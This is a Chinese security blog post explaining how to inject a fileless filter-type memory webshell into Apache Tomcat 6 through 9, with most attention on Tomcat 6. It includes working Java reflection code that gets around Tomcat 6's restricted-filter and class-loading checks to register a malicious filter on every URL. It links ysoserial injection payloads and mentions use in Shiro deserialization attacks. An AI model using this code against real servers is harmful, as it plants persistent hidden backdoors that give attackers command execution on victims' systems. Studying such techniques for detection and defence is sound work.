---
title: "tomcat6、7、8、9内存马"
source: "https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/"
author:
  - "[[huahua's Blog]]"
published: 2021-10-11
created: 2025-03-19
description: "前言最近在学习java内存马，发现一个现象，目前网上写的tomcat内存马基本都是在tomcat7、8、9三个版本使用，对于tomcat6却很少有内存马的文章出现。这样就会造成不全面的情况，因为tomcat6其实在项目中还是能遇到很多的，如果遇到总不能放弃。因此决定研究一下。本篇文章研究的内存马类型仅限于filter类型内存马。"
tags:
  - "clippings"
---
### 前言

最近在学习java内存马，发现一个现象，目前网上写的tomcat内存马基本都是在tomcat7、8、9三个版本使用，对于tomcat6却很少有内存马的文章出现。这样就会造成不全面的情况，因为tomcat6其实在项目中还是能遇到很多的，如果遇到总不能放弃。因此决定研究一下。本篇文章研究的内存马类型仅限于filter类型内存马。

### 分析

#### tomcat7、8、9

首先对于tomcat7、8、9三个版本的内存马最开始参考了threedr3am师傅的文章:[https://xz.aliyun.com/t/7388](https://xz.aliyun.com/t/7388)(基于tomcat的内存 Webshell 无文件攻击技术)。打内存马主要分为两大块，第一块是找request/response或者说找目标容器的context，第二块是在目标的filter链中插入一条自己的恶意filter，该filter的功能为执行命令(或代理等)。

针对第一块内容，threedr3am师傅采用了反射修改ApplicationDispatcher.WRAP\_SAME\_OBJECT值为ture，因此在this.pos>=this.n也就是filter链走完的时候就可以将request和response分别保存到lastServicedRequest和lastServicedResponse中。下次在通过反射获取lastServicedRequest和lastServicedResponse的值就能得到request和response了。该过程对应threedr3am师傅修改的ysoserial中的**TomcatEchoInject**:[https://github.com/threedr3am/ysoserial/blob/master/src/main/java/ysoserial/payloads/TomcatEchoInject.java](https://github.com/threedr3am/ysoserial/blob/master/src/main/java/ysoserial/payloads/TomcatEchoInject.java)

![image-20211011235058415](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211011235058415.png)

![image-20211011235042965](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211011235042965.png)

针对第二大块内容则在于操作什么才能控制目标tomcat容器的filter链的添加。先随便创建一个filter，看下其堆栈。

![image-20211012154340998](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012154340998.png)

可以看到其filter是从ApplicationFilterChain的this.filters中取出来的。我们继续往前找，看ApplicationFilterChain这个类是如何实例化的。![image-20211012154543364](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012154543364.png)

发现filterChain是由ApplicationFilterFactory.createFilterChain(request, wrapper, servlet)生成的，根据去看具体实现。

![image-20211012154855314](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012154855314.png)

可以看到该方法从context中取出filterMap和filterConfig，并取符合request的url的filterConfig加入到filterChain中。那我们只要控制context添加filterMap和filterConfig就能控制filterChain中的filter了。

![image-20211012155050838](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012155050838.png)

该context正是StandardContext

![image-20211012155159273](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012155159273.png)

StandardContext中包含有添加filterDef和filterMap的方法，那么添加filterConfig的方法在哪呢？

![image-20211012155502440](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012155502440.png)

CTRL+F搜索filterConfig，发现filterStart()取出了filterDef作为参数生成了filterConfigs。那么到此大功告成。只要我们在恶意代码里反射将我们之前获取的StandContext中调用这些添加方法(addFilterDef、addFilterMap)即可。然后最后运行一个filterStart 将addFilterDef整合到filterConfig中。

不过还有一个问题是filterDef和filterMap类怎么构造，哪些参数要填，这个我们当然直接跟到类里面看参数猜，也能猜出大概，不过总归不靠谱。看threedr3am师傅，其参考了动态注册filter的文章，找到了正常添加filter的代码。

![image-20211012160917944](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012160917944.png)

也就是先调用ApplicationContext添加一个filterDef，然后获得一个ApplicationFilterRegistration(filterDef, this.context)对象然后调用其addMappingForUrlPatterns方法添加filterMap

![image-20211012162638982](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012162638982.png)

![image-20211012162449366](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012162449366.png)

从上面两张图可以分别找到filterDef和filterMap的构造方式，我们可以直接用tomcat自己封装的这些方法。代码方面看threedr3am师傅写的ysoserial中的TomcatShellInject：[https://github.com/threedr3am/ysoserial/blob/master/src/main/java/ysoserial/payloads/TomcatShellInject.java](https://github.com/threedr3am/ysoserial/blob/master/src/main/java/ysoserial/payloads/TomcatShellInject.java)

不过tomcat7、8、9不是我本文的重点，这些网上都有很多，本文重点主要是如何在tomcat6打内存马

#### tomcat6

![image-20211012163402646](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012163402646.png)

在threedr3am师傅的文章下有人提出了tomcat6用不了的问题，问题虽然存在，不过原因并不是图中的原因。DispatcherType类在tomcat6中不存在是因为在tomcat6中dispatch使用字符串表示的，所以在设置FilterMap的使用直接setDispatcher(“REQUEST”)就行了不用之前的DispatcherType类;

![image-20211012164531380](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012164531380.png)

其实最根本的tomcat6不能打内存马的原因是tomcat6中的FilterDef类中无法存储Filter类型的对象，可以看到下面第一张图的FilterDef中存储的全是字符串

![image-20211012164502601](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012164502601.png)

![image-20211012164730054](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012164730054.png)

而tomcat8版本的FilterDef中有个字段filter存储的是Filter对象，可见上面的第二张图，这个差距我们具体向下看就能知道影响在哪。

查看tomcat6中StandardContext中filterStart方法，记性好的可能还记得这个方法之前提过，是用来把filterDef包装整合到filterConfig的。因为ApplicationFilterChain是从StandardContext的filterConfigs中取得filter，因此filterConfigs才是实实在在得。那我们具体看tomcat6中该方法过程。

![image-20211012165259893](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012165259893.png)

关键在于上图中红色箭头指向得那一步,跟入

![image-20211012165359305](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012165359305.png)

再跟入this.getFilter()

![image-20211012165509523](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012165509523.png)

好家伙，这时候大家看出来问题了，搞半天tomcat6中得filter是根据filterDef提供的类名使用classloader进行加载的。那我们的恶意类必然是不可能在目标服务器上能通过classloader加载到的。这才是tomcat6无法打内存马的症结！有办法突破吗？当然可以突破。这里我们只需要把this.filterDef.getFilterClass()得到的类名设置为一个tomcat上本身存在的类名即可然后将其实例化赋值到this.filter中。这时，我们把通过反射把filter修改为我们的evilFilter。那么我们就有一个包装了恶意类的filterConfig对象了。再把这个filterConfig对象填充到filterConfigs数组中即大功告成。

接下来找tomcat中本身存在的Filter对象，只有SSIFilter是tomcat6中本身存在的，其他的都是我项目中其他jar包的FIlter。

![image-20211012170315035](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012170315035.png)

但在我实际操作过程中出现了一个状况，就是SSIFilter不满足下图中红色箭头标注的条件。

![image-20211012170559855](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012170559855.png)

![image-20211012170644035](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012170644035.png)

不过也没关系，继续反射将restrictedFilters反射修改使得函数返回true即可。下面贴出代码，下面代码中少一个StandardContext，这个用[https://xz.aliyun.com/t/9914#toc-3中的方式获取即可。](https://xz.aliyun.com/t/9914#toc-3%E4%B8%AD%E7%9A%84%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E5%8D%B3%E5%8F%AF%E3%80%82)

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57//tomcat6
       try {
           Constructor filterDefConstructor =org.apache.catalina.deploy.FilterDef.class.getConstructor(new Class[]{});
           org.apache.catalina.deploy.FilterDef filterDef=(org.apache.catalina.deploy.FilterDef)filterDefConstructor.newInstance();
           filterDef.setFilterName(filterName);
           Method addFilterDef=standardContext.getClass().getMethod("addFilterDef", org.apache.catalina.deploy.FilterDef.class);
           addFilterDef.invoke(standardContext,filterDef);
           filterDef.setFilterClass(evilFilter.getClass().getName());
           if(filterDef.getParameterMap().get("encoding")!=null){
               filterDef.addInitParameter("encoding","utf-8");
           }
           Constructor filterMapConstructor =org.apache.catalina.deploy.FilterMap.class.getConstructor(new Class[]{});
           org.apache.catalina.deploy.FilterMap filterMap=(org.apache.catalina.deploy.FilterMap)filterMapConstructor.newInstance();
           filterMap.setFilterName(filterDef.getFilterName());
           filterMap.setDispatcher("REQUEST");
           filterMap.addURLPattern("/*");
           Method addFilterMap=standardContext.getClass().getDeclaredMethod("addFilterMap", org.apache.catalina.deploy.FilterMap.class);
           addFilterMap.invoke(standardContext,filterMap);
           //创建一个filterConfig,因为tomcat6在new ApplicationFilterConfig的时候会由于到不到我们的恶意类而报错not found class，因此需要先创建一个存在的filterCOnfig，然后反射修改
           org.apache.catalina.deploy.FilterDef tmpFilterDef=(org.apache.catalina.deploy.FilterDef)filterDefConstructor.newInstance();
           tmpFilterDef.setFilterClass("org.apache.catalina.ssi.SSIFilter");
           tmpFilterDef.setFilterName(filterName);
           Constructor applicationFilterConfigConstructor=org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, org.apache.catalina.deploy.FilterDef.class);
           applicationFilterConfigConstructor.setAccessible(true);
           //filterConfig实例化之前由于org.apache.catalina.ssi.SSIFilter是被限制的类，不能放入ApplicationFilterConfig中，因此要反射修改限制条件
           Properties properties=new Properties();
           properties.put("org.apache.catalina.ssi.SSIFilter","123");
           Field restrictedFiltersField= ApplicationFilterConfig.class.getDeclaredField("restrictedFilters");
           restrictedFiltersField.setAccessible(true);
           restrictedFiltersField.set(null,properties);
           //用假的org.apache.catalina.ssi.SSIFilter创建一个filterConfig
           ApplicationFilterConfig filterConfig=(ApplicationFilterConfig)applicationFilterConfigConstructor.newInstance(standardContext,tmpFilterDef);
           //反射将filterConfig的filter从org.apache.catalina.ssi.SSIFilter替换为我们的恶意filter
           Field filterField=filterConfig.getClass().getDeclaredField("filter");
           filterField.setAccessible(true);
           filterField.set(filterConfig,evilFilter);
           //将假的filterDef替换为恶意类的filterDef对象
           Field filterDefField=filterConfig.getClass().getDeclaredField("filterDef");
           filterDefField.setAccessible(true);
           filterDefField.set(filterConfig,filterDef);
           //将filterConfig反射添加到StandardContext中
           Field filterConfigsField=org.apache.catalina.core.StandardContext.class.getDeclaredField("filterConfigs");
           filterConfigsField.setAccessible(true);
           HashMap filterConfigs=(HashMap)filterConfigsField.get(standardContext);
           filterConfigs.put(filterName,filterConfig);
           filterConfigsField.set(standardContext,filterConfigs);
       } catch (NoSuchMethodException ex) {
           ex.printStackTrace();
       } catch (IllegalAccessException ex) {
           ex.printStackTrace();
       } catch (InvocationTargetException ex) {
           ex.printStackTrace();
       } catch (InstantiationException ex) {
           ex.printStackTrace();
       } catch (NoSuchFieldException ex) {
           ex.printStackTrace();
       }
```

这次里码没把evilFilter的filterConfig放到filterConfigs数组的第一位，如果打shiro的话把其放到第一位即可。下图代码截图是把恶意代码直接加载到内存中实例化，模拟反序列化漏洞利用中的最后一个环节。

![image-20211012171713472](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012171713472.png)

![image-20211012171717256](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/image-20211012171717256.png)

### 后记

思路其实很简单，就是跟到tomcat7、8、9的实现底层，虽然tomcat6不存在tomcat7、8、9的那些包装函数，不过通过我们的一通反射之后模拟tomcat7、8、9的底层实现方法即可创建出我们的恶意filter。也算是创新了，觉得比较有意义，因此记录发表出来。